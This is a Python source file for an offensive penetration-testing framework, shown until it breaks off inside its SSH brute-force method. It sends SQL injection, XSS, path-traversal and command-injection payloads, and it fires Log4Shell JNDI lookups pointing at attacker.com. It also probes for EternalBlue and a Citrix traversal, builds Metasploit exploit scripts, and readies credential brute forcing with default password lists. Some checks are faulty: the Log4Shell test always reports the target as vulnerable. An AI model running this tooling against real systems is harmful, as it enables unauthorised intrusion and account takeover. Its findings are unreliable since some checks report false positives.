#!/usr/bin/env python3
"""
ULTIMATE Ethical Hacking Automation Framework (UEHAF) v2.0
Comprehensive penetration testing suite with advanced modules.
FOR AUTHORIZED USE ONLY - Educational & Professional Security Testing
"""

import asyncio
import json
import subprocess
import socket
import requests
import ssl
import sys
import re
import hashlib
import base64
import xml.etree.ElementTree as ET
from datetime import datetime
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
import random
import string
import time
import threading
import itertools

# ============================================
# CONFIGURATION & DATA MODELS
# ============================================

@dataclass
class Config:
    timeout: int = 5
    max_threads: int = 100
    output_dir: str = "./scan_results"
    wordlist_dir: str = "./wordlists"
    user_agent: str = "UEHAF-Security-Scanner/2.0"
    rate_limit_delay: float = 0.1
    max_retries: int = 3
    
    # Port configurations
    common_ports: List[int] = field(default_factory=lambda: [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
        993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200
    ])
    
    # API testing
    api_endpoints: List[str] = field(default_factory=lambda: [
        '/api', '/api/v1', '/api/v2', '/rest', '/graphql', '/swagger',
        '/api-docs', '/openapi.json', '/swagger.json', '/api/users'
    ])

CONFIG = Config()

@dataclass
class PortScanResult:
    port: int
    state: str
    service: str
    banner: Optional[str] = None
    version: Optional[str] = None

@dataclass
class WebVuln:
    type: str
    severity: str
    url: str
    description: str
    evidence: Optional[str] = None
    remediation: Optional[str] = None

@dataclass
class ExploitResult:
    name: str
    target: str
    success: bool
    output: str
    session_info: Optional[Dict] = None

@dataclass
class BruteForceResult:
    service: str
    target: str
    username: str
    password: Optional[str] = None
    success: bool = False
    error: Optional[str] = None

@dataclass
class APIEndpoint:
    path: str
    method: str
    params: List[str]
    auth_required: bool
    response_sample: Optional[str] = None

@dataclass
class CloudFinding:
    provider: str
    service: str
    issue: str
    severity: str
    resource: str
    remediation: str

@dataclass
class WirelessNetwork:
    bssid: str
    ssid: str
    channel: int
    encryption: str
    signal: int
    vulnerabilities: List[str] = field(default_factory=list)

@dataclass
class HostResult:
    ip: str
    hostname: Optional[str]
    ports: List[PortScanResult]
    web_vulns: List[WebVuln]
    api_endpoints: List[APIEndpoint] = field(default_factory=list)
    exploits: List[ExploitResult] = field(default_factory=list)
    brute_results: List[BruteForceResult] = field(default_factory=list)
    cloud_findings: List[CloudFinding] = field(default_factory=list)
    ssl_info: Optional[Dict] = None
    os_guess: Optional[str] = None

# ============================================
# MODULE 1: NETWORK RECONNAISSANCE (ENHANCED)
# ============================================

class ReconModule:
    """Advanced network reconnaissance"""
    
    @staticmethod
    def resolve_hostname(target: str) -> Tuple[str, Optional[str]]:
        try:
            ip = socket.gethostbyname(target)
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                hostname = None
            return ip, hostname
        except socket.gaierror:
            return target, None
    
    @staticmethod
    def ping_host(ip: str) -> bool:
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '2', ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def traceroute(target: str) -> List[str]:
        """Perform traceroute to target"""
        hops = []
        try:
            result = subprocess.run(
                ['traceroute', '-m', '15', target],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split('\n')[1:]:
                if line.strip():
                    hop = line.split()[1] if len(line.split()) > 1 else '*'
                    hops.append(hop)
        except:
            pass
        return hops
    
    @staticmethod
    def dns_enum(domain: str) -> Dict:
        """Comprehensive DNS enumeration"""
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR']
        
        for rtype in record_types:
            try:
                result = subprocess.run(
                    ['dig', '+short', domain, rtype],
                    capture_output=True, text=True
                )
                if result.stdout.strip():
                    records[rtype] = result.stdout.strip().split('\n')
            except:
                pass
        
        # Zone transfer attempt
        try:
            ns_records = records.get('NS', [])
            for ns in ns_records:
                result = subprocess.run(
                    ['dig', '@' + ns, domain, 'AXFR'],
                    capture_output=True, text=True
                )
                if 'Transfer failed' not in result.stderr:
                    records['zone_transfer'] = 'Potentially vulnerable'
        except:
            pass
        
        # Subdomain brute force
        common_subs = [
            'www', 'mail', 'ftp', 'admin', 'api', 'blog', 'shop', 'dev',
            'test', 'staging', 'vpn', 'remote', 'dashboard', 'panel', 'cp',
            'webmail', 'secure', 'portal', 'app', 'mobile', 'cdn', 'static',
            'media', 'files', 'download', 'upload', 'git', 'svn', 'backup'
        ]
        subdomains = []
        
        def check_subdomain(sub):
            try:
                subdomain = f"{sub}.{domain}"
                socket.gethostbyname(subdomain)
                return subdomain
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in common_subs]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomains.append(result)
        
        records['subdomains'] = subdomains
        return records
    
    @staticmethod
    def os_fingerprint(ip: str) -> Optional[str]:
        """Basic OS fingerprinting via TTL"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', ip],
                capture_output=True, text=True
            )
            ttl_match = re.search(r'ttl=(\d+)', result.stdout, re.IGNORECASE)
            if ttl_match:
                ttl = int(ttl_match.group(1))
                if ttl <= 64:
                    return "Linux/Unix"
                elif ttl <= 128:
                    return "Windows"
                elif ttl <= 255:
                    return "Cisco/Network Device"
        except:
            pass
        return None

# ============================================
# MODULE 2: ADVANCED PORT SCANNER
# ============================================

class PortScanner:
    """Advanced multi-threaded port scanner with service detection"""
    
    def __init__(self, config: Config = CONFIG):
        self.config = config
        self.service_signatures = {
            21: (b"220", "FTP"),
            22: (b"SSH-", "SSH"),
            23: (b"login:", "Telnet"),
            25: (b"220", "SMTP"),
            80: (b"HTTP", "HTTP"),
            110: (b"+OK", "POP3"),
            143: (b"* OK", "IMAP"),
            443: (b"", "HTTPS"),
            445: (b"", "SMB"),
            3306: (b"mysql", "MySQL"),
            3389: (b"", "RDP"),
            5432: (b"PostgreSQL", "PostgreSQL"),
            6379: (b"+PONG", "Redis"),
            8080: (b"", "HTTP-Proxy"),
            9200: (b"elasticsearch", "Elasticsearch")
        }
    
    def _grab_banner(self, sock: socket.socket, port: int) -> Tuple[Optional[str], Optional[str]]:
        """Enhanced banner grabbing with version extraction"""
        try:
            sock.settimeout(3)
            
            if port == 80 or port == 8080:
                sock.send(b"HEAD / HTTP/1.1\r\nHost: target\r\n\r\n")
            elif port == 443 or port == 8443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock)
                sock.send(b"HEAD / HTTP/1.1\r\nHost: target\r\n\r\n")
            elif port in self.service_signatures:
                if port == 21:
                    sock.send(b"USER anonymous\r\n")
                elif port == 22:
                    pass
                else:
                    sock.send(b"\r\n")
            
            banner = sock.recv(2048).decode('utf-8', errors='ignore').strip()
            
            # Extract version
            version = None
            version_patterns = [
                r'(\d+\.\d+\.\d+)',  # Generic version
                r'SSH-(\d+\.\d+)',    # SSH version
                r'(\d+\.\d+)',        # Simple version
            ]
            for pattern in version_patterns:
                match = re.search(pattern, banner)
                if match:
                    version = match.group(1)
                    break
            
            return banner[:500], version
            
        except:
            return None, None
    
    def _scan_port(self, ip: str, port: int) -> Optional[PortScanResult]:
        """Scan single port with SYN stealth option"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                service = self.service_signatures.get(port, (None, "unknown"))[1]
                banner, version = self._grab_banner(sock, port)
                sock.close()
                return PortScanResult(port, "open", service, banner, version)
            
            sock.close()
        except:
            pass
        return None
    
    def scan(self, ip: str, ports: Optional[List[int]] = None) -> List[PortScanResult]:
        """Full port scan"""
        ports = ports or self.config.common_ports
        results = []
        
        print(f"[*] Scanning {len(ports)} ports on {ip}...")
        
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            future_to_port = {
                executor.submit(self._scan_port, ip, port): port 
                for port in ports
            }
            
            for future in as_completed(future_to_port):
                result = future.result()
                if result:
                    results.append(result)
                    ver_info = f" ({result.version})" if result.version else ""
                    print(f"  [+] Port {result.port}/{result.service}{ver_info} - {result.state}")
        
        return sorted(results, key=lambda x: x.port)
    
    def syn_scan(self, ip: str, ports: List[int]) -> List[int]:
        """TCP SYN scan (requires root)"""
        open_ports = []
        try:
            from scapy.all import sr1, IP, TCP
            
            for port in ports:
                pkt = IP(dst=ip)/TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=1, verbose=0)
                if resp and resp.haslayer(TCP) and resp[TCP].flags == "SA":
                    open_ports.append(port)
                    # Send RST to close
                    sr1(IP(dst=ip)/TCP(dport=port, flags="R"), timeout=1, verbose=0)
        except ImportError:
            print("[-] Scapy not installed, falling back to connect scan")
            return []
        return open_ports

# ============================================
# MODULE 3: WEB VULNERABILITY SCANNER (ADVANCED)
# ============================================

class WebScanner:
    """Advanced web application security scanner"""
    
    def __init__(self, config: Config = CONFIG):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.vulns: List[WebVuln] = []
        self.visited_urls: Set[str] = set()
    
    def _rate_limit(self):
        """Apply rate limiting"""
        time.sleep(self.config.rate_limit_delay)
    
    def _check_headers(self, url: str, response: requests.Response):
        """Comprehensive security header analysis"""
        headers = response.headers
        
        security_headers = {
            'X-Frame-Options': {
                'desc': 'Clickjacking protection',
                'remediation': 'Add: X-Frame-Options: DENY or SAMEORIGIN'
            },
            'X-XSS-Protection': {
                'desc': 'XSS filter',
                'remediation': 'Add: X-XSS-Protection: 1; mode=block'
            },
            'X-Content-Type-Options': {
                'desc': 'MIME sniffing protection',
                'remediation': 'Add: X-Content-Type-Options: nosniff'
            },
            'Content-Security-Policy': {
                'desc': 'Content Security Policy',
                'remediation': 'Add: Content-Security-Policy with appropriate directives'
            },
            'Strict-Transport-Security': {
                'desc': 'HSTS',
                'remediation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains'
            },
            'Referrer-Policy': {
                'desc': 'Referrer policy',
                'remediation': 'Add: Referrer-Policy: strict-origin-when-cross-origin'
            },
            'Permissions-Policy': {
                'desc': 'Permissions policy',
                'remediation': 'Add: Permissions-Policy with restricted features'
            }
        }
        
        for header, info in security_headers.items():
            if header not in headers:
                self.vulns.append(WebVuln(
                    type="Missing Security Header",
                    severity="Low",
                    url=url,
                    description=f"{header} ({info['desc']}) is missing",
                    evidence=f"Header not found in response",
                    remediation=info['remediation']
                ))
        
        # Check for information disclosure headers
        info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Generator']
        for header in info_headers:
            if header in headers:
                self.vulns.append(WebVuln(
                    type="Information Disclosure",
                    severity="Info",
                    url=url,
                    description=f"{header} reveals server information",
                    evidence=f"{header}: {headers[header]}",
                    remediation=f"Remove or obfuscate the {header} header"
                ))
    
    def _check_ssl_tls(self, url: str) -> Optional[Dict]:
        """Advanced SSL/TLS analysis"""
        if not url.startswith('https'):
            self.vulns.append(WebVuln(
                type="Insecure Protocol",
                severity="Medium",
                url=url,
                description="Site does not use HTTPS",
                evidence="Connection is not encrypted",
                remediation="Enable HTTPS and redirect HTTP to HTTPS"
            ))
            return None
        
        try:
            hostname = url.split('//')[1].split('/')[0].split(':')[0]
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    version = ssock.version()
                    cert = ssock.getpeercert()
                    
                    ssl_info = {
                        'version': version,
                        'cipher': cipher[0],
                        'bits': cipher[2],
                        'cert_subject': cert.get('subject'),
                        'cert_issuer': cert.get('issuer'),
                        'cert_not_after': cert.get('notAfter'),
                        'cert_not_before': cert.get('notBefore')
                    }
                    
                    # Check for weak protocols
                    weak_versions = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
                    if version in weak_versions:
                        self.vulns.append(WebVuln(
                            type="Weak SSL/TLS Protocol",
                            severity="High",
                            url=url,
                            description=f"Using deprecated protocol: {version}",
                            evidence=f"Protocol version: {version}",
                            remediation="Disable weak protocols, enable TLS 1.2+ only"
                        ))
                    
                    # Check certificate expiration
                    if cert.get('notAfter'):
                        from datetime import datetime
                        expiry = cert['notAfter']
                        # Simple check - would need proper parsing
                        self.vulns.append(WebVuln(
                            type="Certificate Info",
                            severity="Info",
                            url=url,
                            description=f"Certificate expires: {expiry}",
                            evidence=f"Subject: {cert.get('subject')}",
                            remediation="Monitor certificate expiration"
                        ))
                    
                    return ssl_info
        except Exception as e:
            self.vulns.append(WebVuln(
                type="SSL/TLS Error",
                severity="Medium",
                url=url,
                description=f"SSL/TLS connection issue: {str(e)}",
                evidence=str(e),
                remediation="Check SSL certificate configuration"
            ))
            return None
    
    def _check_common_paths(self, base_url: str):
        """Check for sensitive paths and files"""
        sensitive_paths = [
            ('/admin', 'Admin panel'),
            ('/administrator', 'Admin panel'),
            ('/login', 'Login page'),
            ('/wp-admin', 'WordPress admin'),
            ('/phpmyadmin', 'phpMyAdmin'),
            ('/api', 'API endpoint'),
            ('/.env', 'Environment file'),
            ('/config.php', 'Config file'),
            ('/.git', 'Git repository'),
            ('/.svn', 'SVN repository'),
            ('/backup', 'Backup directory'),
            ('/robots.txt', 'Robots file'),
            ('/sitemap.xml', 'Sitemap'),
            ('/crossdomain.xml', 'Flash crossdomain'),
            ('/clientaccesspolicy.xml', 'Silverlight policy'),
            ('/.htaccess', 'Apache config'),
            ('/server-status', 'Apache status'),
            ('/actuator', 'Spring Boot actuator'),
            ('/swagger-ui.html', 'Swagger UI'),
            ('/api-docs', 'API docs'),
            ('/graphql', 'GraphQL endpoint'),
            ('/debug', 'Debug endpoint'),
            ('/trace', 'Trace endpoint'),
            ('/env', 'Environment endpoint'),
            ('/metrics', 'Metrics endpoint'),
            ('/dump', 'Heap dump'),
            ('/heapdump', 'Heap dump'),
            ('/configprops', 'Config properties'),
            ('/logfile', 'Log file'),
            ('/jolokia', 'Jolokia endpoint'),
            ('/api/v1/users', 'Users API'),
            ('/api/v2/users', 'Users API'),
            ('/users', 'Users endpoint'),
            ('/api/user', 'User API'),
            ('/api/admin', 'Admin API'),
            ('/api/config', 'Config API'),
            ('/api/settings', 'Settings API'),
            ('/api/keys', 'Keys API'),
            ('/api/secrets', 'Secrets API'),
            ('/.well-known/security.txt', 'Security policy'),
            ('/security.txt', 'Security policy'),
        ]
        
        for path, description in sensitive_paths:
            try:
                self._rate_limit()
                url = f"{base_url}{path}"
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                if response.status_code in [200, 201, 202, 203]:
                    self.vulns.append(WebVuln(
                        type="Exposed Resource",
                        severity="Info",
                        url=url,
                        description=f"Potentially sensitive path accessible: {description}",
                        evidence=f"HTTP {response.status_code} - {len(response.content)} bytes",
                        remediation=f"Restrict access to {path} or remove if unnecessary"
                    ))
                elif response.status_code == 401:
                    self.vulns.append(WebVuln(
                        type="Protected Resource",
                        severity="Info",
                        url=url,
                        description=f"Authentication required for: {description}",
                        evidence=f"HTTP {response.status_code}",
                        remediation="Ensure strong authentication is enforced"
                    ))
            except:
                pass
    
    def _check_sqli(self, url: str):
        """Advanced SQL injection detection"""
        sqli_payloads = [
            ("'", "Single quote"),
            ("''", "Double single quote"),
            ("' OR '1'='1", "OR-based"),
            ("' OR 1=1--", "Comment-based"),
            ("' UNION SELECT NULL--", "UNION-based"),
            ("1' AND 1=1--", "AND-based"),
            ("1' AND 1=2--", "Boolean-based"),
            ("1' AND SLEEP(5)--", "Time-based"),
            ("1'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based"),
            ("1' AND pg_sleep(5)--", "PostgreSQL time-based"),
        ]
        
        error_signatures = [
            'sql syntax', 'mysql_fetch', 'pg_query', 'pg_exec',
            'ORA-', 'oracle', 'microsoft ole db', 'odbc driver',
            'sql server', 'sqlite', 'pdoexception', 'sqlstate',
            'syntax error', 'unexpected', 'warning: mysql',
            'unclosed quotation mark', 'quoted string not properly terminated'
        ]
        
        parsed = urlparse(url)
        if not parsed.query:
            # Try common parameter names
            test_params = ['id', 'page', 'user', 'product', 'cat', 'item', 'pid']
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            for param in test_params:
                for payload, desc in sqli_payloads:
                    try:
                        self._rate_limit()
                        test_url = f"{base_url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=10)
                        
                        if any(err in response.text.lower() for err in error_signatures):
                            self.vulns.append(WebVuln(
                                type="SQL Injection",
                                severity="Critical",
                                url=url,
                                description=f"SQL injection vulnerability detected ({desc})",
                                evidence=f"Payload: {payload[:50]}...",
                                remediation="Use parameterized queries/prepared statements"
                            ))
                            return
                        
                        # Time-based check
                        if 'SLEEP' in payload or 'sleep' in payload:
                            start = time.time()
                            response = self.session.get(test_url, timeout=10)
                            elapsed = time.time() - start
                            if elapsed > 4:
                                self.vulns.append(WebVuln(
                                    type="SQL Injection (Time-based)",
                                    severity="Critical",
                                    url=url,
                                    description=f"Time-based SQL injection detected",
                                    evidence=f"Payload: {payload}, Delay: {elapsed:.2f}s",
                                    remediation="Use parameterized queries/prepared statements"
                                ))
                                return
                    except:
                        pass
    
    def _check_xss(self, url: str):
        """Advanced XSS detection"""
        xss_payloads = [
            ("<script>alert('XSS')</script>", "Basic script"),
            ("<img src=x onerror=alert('XSS')>", "Image onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("javascript:alert('XSS')", "JavaScript protocol"),
            ("'><script>alert('XSS')</script>", "Tag breakout"),
            ("\" onmouseover=\"alert('XSS')", "Event handler"),
            ("<iframe src=javascript:alert('XSS')>", "Iframe"),
            ("<body onload=alert('XSS')>", "Body onload"),
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Test URL parameters
        test_params = ['q', 'search', 'query', 's', 'keyword', 'term', 'name', 'id']
        
        for param in test_params:
            for payload, desc in xss_payloads:
                try:
                    self._rate_limit()
                    test_url = f"{base_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        # Check if properly encoded
                        if payload not in response.text.replace('&lt;', '<').replace('&gt;', '>'):
                            self.vulns.append(WebVuln(
                                type="Cross-Site Scripting (XSS)",
                                severity="High",
                                url=url,
                                description=f"Reflected XSS vulnerability ({desc})",
                                evidence=f"Payload reflected unencoded: {payload[:50]}...",
                                remediation="Encode all user input, implement CSP headers"
                            ))
                            return
                except:
                    pass
    
    def _check_lfi(self, url: str):
        """Local File Inclusion detection"""
        lfi_payloads = [
            ('../../../etc/passwd', 'Unix passwd'),
            ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'Windows hosts'),
            ('....//....//....//etc/passwd', 'Bypass attempt'),
            ('/etc/passwd', 'Absolute path'),
            ('php://filter/read=convert.base64-encode/resource=index.php', 'PHP filter'),
            ('file:///etc/passwd', 'File protocol'),
        ]
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        for payload, desc in lfi_payloads:
            try:
                self._rate_limit()
                test_url = url.replace('=', f'={payload}')
                response = self.session.get(test_url, timeout=5)
                
                # Check for passwd file contents
                if 'root:x:' in response.text or 'bin:x:' in response.text:
                    self.vulns.append(WebVuln(
                        type="Local File Inclusion (LFI)",
                        severity="Critical",
                        url=url,
                        description=f"LFI vulnerability detected ({desc})",
                        evidence=f"System file contents exposed",
                        remediation="Validate and sanitize file paths, use allowlists"
                    ))
                    return
            except:
                pass
    
    def _check_rce(self, url: str):
        """Remote Code Execution detection"""
        rce_payloads = [
            (';id', 'Command injection'),
            ('|id', 'Pipe injection'),
            ('`id`', 'Backtick injection'),
            ('$(id)', 'Command substitution'),
            (';cat /etc/passwd', 'File read'),
            (';whoami', 'User enumeration'),
        ]
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        for payload, desc in rce_payloads:
            try:
                self._rate_limit()
                test_url = url.replace('=', f'={payload}')
                response = self.session.get(test_url, timeout=5)
                
                # Check for command output
                if 'uid=' in response.text or 'gid=' in response.text:
                    self.vulns.append(WebVuln(
                        type="Remote Code Execution (RCE)",
                        severity="Critical",
                        url=url,
                        description=f"Command injection vulnerability ({desc})",
                        evidence=f"Command output in response",
                        remediation="Never pass user input to system commands"
                    ))
                    return
            except:
                pass
    
    def _check_csrf(self, url: str):
        """CSRF token validation check"""
        try:
            response = self.session.get(url, timeout=5)
            
            # Check for forms without CSRF tokens
            forms = re.findall(r'<form[^>]*>.*?</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            for form in forms:
                if 'method="post"' in form.lower() or "method='post'" in form.lower():
                    csrf_patterns = ['csrf', 'token', '_token', 'authenticity', 'nonce']
                    has_token = any(pattern in form.lower() for pattern in csrf_patterns)
                    
                    if not has_token:
                        self.vulns.append(WebVuln(
                            type="Missing CSRF Protection",
                            severity="Medium",
                            url=url,
                            description="Form submission lacks CSRF token",
                            evidence="POST form without anti-CSRF token",
                            remediation="Add CSRF tokens to all state-changing forms"
                        ))
        except:
            pass
    
    def _check_idor(self, url: str):
        """Insecure Direct Object Reference check"""
        # Look for numeric IDs in URL
        id_patterns = [
            r'[?&]id=(\d+)',
            r'[?&]user_id=(\d+)',
            r'[?&]account=(\d+)',
            r'[?&]order=(\d+)',
        ]
        
        for pattern in id_patterns:
            match = re.search(pattern, url)
            if match:
                current_id = int(match.group(1))
                
                # Try adjacent IDs
                for test_id in [current_id + 1, current_id - 1, current_id + 100]:
                    try:
                        self._rate_limit()
                        test_url = re.sub(pattern, f'\\1={test_id}', url)
                        response = self.session.get(test_url, timeout=5)
                        
                        if response.status_code == 200:
                            self.vulns.append(WebVuln(
                                type="Insecure Direct Object Reference (IDOR)",
                                severity="High",
                                url=url,
                                description=f"IDOR vulnerability - can access ID {test_id}",
                                evidence=f"ID parameter: {match.group(0)}",
                                remediation="Implement proper authorization checks for all object access"
                            ))
                            return
                    except:
                        pass
    
    def _check_cors(self, url: str):
        """CORS misconfiguration check"""
        try:
            # Test with arbitrary origin
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(url, headers=headers, timeout=5)
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            
            if acao == '*':
                self.vulns.append(WebVuln(
                    type="CORS Misconfiguration",
                    severity="Medium",
                    url=url,
                    description="Wildcard CORS allows any origin",
                    evidence="Access-Control-Allow-Origin: *",
                    remediation="Specify exact allowed origins"
                ))
            elif acao == 'https://evil.com':
                self.vulns.append(WebVuln(
                    type="CORS Misconfiguration",
                    severity="High",
                    url=url,
                    description="CORS reflects arbitrary origin",
                    evidence=f"Reflected origin: {acao}",
                    remediation="Validate origins against allowlist"
                ))
            
            if acac == 'true' and acao == '*':
                self.vulns.append(WebVuln(
                    type="CORS Misconfiguration",
                    severity="Critical",
                    url=url,
                    description="CORS with credentials and wildcard is dangerous",
                    evidence="Allow-Credentials: true with wildcard origin",
                    remediation="Never use wildcard with credentials"
                ))
        except:
            pass
    
    def scan(self, target: str) -> Tuple[List[WebVuln], Optional[Dict]]:
        """Run comprehensive web scan"""
        url = target if target.startswith('http') else f"http://{target}"
        print(f"\n[*] Starting comprehensive web scan: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            print(f"  [+] Server: {response.headers.get('Server', 'Unknown')}")
            
            self._check_headers(url, response)
            ssl_info = self._check_ssl_tls(url)
            self._check_common_paths(url)
            self._check_sqli(url)
            self._check_xss(url)
            self._check_lfi(url)
            self._check_rce(url)
            self._check_csrf(url)
            self._check_idor(url)
            self._check_cors(url)
            
        except requests.exceptions.RequestException as e:
            print(f"  [-] Web scan failed: {e}")
        
        return self.vulns, ssl_info

# ============================================
# MODULE 4: EXPLOIT FRAMEWORK INTEGRATION
# ============================================

class ExploitFramework:
    """Integration with exploit frameworks and vulnerability databases"""
    
    def __init__(self):
        self.exploits: List[ExploitResult] = []
        self.cve_db = self._load_cve_db()
    
    def _load_cve_db(self) -> Dict:
        """Load local CVE database (simplified)"""
        # In production, this would connect to NVD or local database
        return {
            'CVE-2021-44228': {
                'name': 'Log4Shell',
                'affected': ['log4j'],
                'severity': 'Critical',
                'check': self._check_log4shell
            },
            'CVE-2017-0144': {
                'name': 'EternalBlue',
                'affected': ['smb', 'windows'],
                'severity': 'Critical',
                'check': self._check_eternalblue
            },
            'CVE-2019-19781': {
                'name': 'Citrix ADC RCE',
                'affected': ['citrix'],
                'severity': 'Critical',
                'check': self._check_citrix
            }
        }
    
    def _check_log4shell(self, target: str, port: int = 8080) -> bool:
        """Check for Log4Shell vulnerability"""
        payloads = [
            '${jndi:ldap://attacker.com/a}',
            '${jndi:dns://attacker.com}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}'
        ]
        
        try:
            for payload in payloads:
                headers = {
                    'X-Api-Version': payload,
                    'User-Agent': payload,
                    'X-Forwarded-For': payload
                }
                response = requests.get(
                    f"http://{target}:{port}",
                    headers=headers,
                    timeout=5
                )
                # In real scenario, would check for DNS callback
                return True  # Placeholder
        except:
            pass
        return False
    
    def _check_eternalblue(self, target: str, port: int = 445) -> bool:
        """Check for EternalBlue vulnerability"""
        try:
            # Check SMB version and signing
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port))
            
            # SMB negotiate protocol
            negotiate = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            # Parse response for Windows version
            if b'Windows' in response or b'NT LM' in response:
                return True
        except:
            pass
        return False
    
    def _check_citrix(self, target: str, port: int = 443) -> bool:
        """Check for Citrix ADC vulnerability"""
        try:
            response = requests.get(
                f"https://{target}/vpn/../vpns/services.html",
                verify=False,
                timeout=5,
                allow_redirects=False
            )
            if response.status_code == 200:
                return True
        except:
            pass
        return False
    
    def check_vulnerabilities(self, target: str, services: List[PortScanResult]) -> List[ExploitResult]:
        """Check for known vulnerabilities"""
        print(f"\n[*] Checking for known vulnerabilities...")
        
        for cve_id, cve_info in self.cve_db.items():
            # Check if any affected service is present
            for service in services:
                if any(affected in service.service.lower() for affected in cve_info['affected']):
                    print(f"  [*] Testing {cve_id} ({cve_info['name']})...")
                    
                    vulnerable = cve_info['check'](target, service.port)
                    
                    result = ExploitResult(
                        name=cve_id,
                        target=f"{target}:{service.port}",
                        success=vulnerable,
                        output=f"{cve_info['name']} - Severity: {cve_info['severity']}",
                        session_info=None
                    )
                    
                    self.exploits.append(result)
                    
                    if vulnerable:
                        print(f"  [!] POTENTIALLY VULNERABLE: {cve_id}")
        
        return self.exploits
    
    def generate_metasploit_resource(self, target: str, exploits: List[str]) -> str:
        """Generate Metasploit resource script"""
        resource_script = f"""# Metasploit Resource Script for {target}
# Generated by UEHAF

use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
run

"""
        for exploit in exploits:
            resource_script += f"""
use {exploit}
set RHOSTS {target}
exploit
"""
        
        resource_script += "\nexit\n"
        return resource_script

# ============================================
# MODULE 5: BRUTE FORCE MODULE
# ============================================

class BruteForceModule:
    """Rate-limited brute force module"""
    
    def __init__(self, config: Config = CONFIG):
        self.config = config
        self.results: List[BruteForceResult] = []
        self.rate_limiter = threading.Lock()
        self.attempt_count = 0
    
    def _rate_limit(self):
        """Apply rate limiting between attempts"""
        with self.rate_limiter:
            self.attempt_count += 1
            if self.attempt_count % 10 == 0:
                time.sleep(1)  # Extra delay every 10 attempts
            time.sleep(self.config.rate_limit_delay)
    
    def _load_wordlist(self, wordlist_type: str) -> List[str]:
        """Load wordlist (with defaults if file not found)"""
        default_wordlists = {
            'users': ['admin', 'root', 'user', 'test', 'guest', 'administrator', 
                     'oracle', 'postgres', 'mysql', 'ftp', 'www', 'web'],
            'passwords': ['password', '123456', 'admin', 'root', 'toor', 
                         'password123', '12345678', 'qwerty', 'letmein',
                         'welcome', 'monkey', 'dragon', 'master']
        }
        
        try:
            with open(f"{self.config.wordlist_dir}/{wordlist_type}.txt", 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return default_wordlists.get(wordlist_type, [])
    
    def brute_ssh(self, target: str, port: int = 22, 
                  max_attempts: int = 50) -> List[BruteForceResult]:
        """SSH brute force with rate limiting"""
        print(f"\n[*] Starting SSH brute force on {target}:{port}")
        
        users = self._load_wordlist('users')[:5]  # Limit for safety
        passwords = self._load_wordlist('passwords')[:10]
        
        try:
            import paramiko
